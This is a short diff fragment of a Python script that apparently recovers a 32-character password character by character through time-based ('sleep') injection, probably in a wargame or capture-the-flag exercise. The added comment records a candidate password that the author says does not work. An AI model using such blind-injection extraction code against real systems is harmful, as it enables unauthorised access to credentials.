@@ -35,3 +35,5 @@ while len(seen_password) < 32:
             seen_password.append(character)
             break  # Move to next position
 print("Recovered password:", ''.join(seen_password))
+
+# final password: a0t5VEOJC3Vphzs5F9FuC0sdkcibcrCW == not working still ... i am done with sleep injections atp
